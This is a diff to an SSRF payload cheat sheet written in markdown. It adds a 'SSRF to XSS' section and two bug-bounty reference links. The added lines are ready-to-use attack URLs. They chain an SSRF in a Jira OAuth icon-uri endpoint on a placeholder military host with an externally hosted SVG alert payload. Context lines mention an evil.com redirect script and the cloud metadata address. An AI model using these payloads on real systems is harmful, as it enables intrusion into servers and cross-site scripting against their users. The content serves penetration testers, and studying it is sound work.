@@ -194,6 +194,15 @@ Content of evil.com/redirect.php:
 ?>
 ```
 
+## SSRF to XSS by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
+```bash
+http://brutelogic.com.br/poc.svg -> simple alert   
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf
+
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
+```
+
+
 
 ## SSRF on AWS Bucket - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
 Interesting path to look for at http://169.254.169.254
@@ -335,3 +344,5 @@ http://100.100.100.200/latest/meta-data/image-id
 * [Enclosed alphanumerics - @EdOverflow](https://twitter.com/EdOverflow)
 * [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity](http://www.sxcurity.pro/2017/12/17/hackertarget/)
 * [PHP SSRF @secjuice](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
+* [How I convert SSRF to xss in a ssrf vulnerable Jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
+* [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
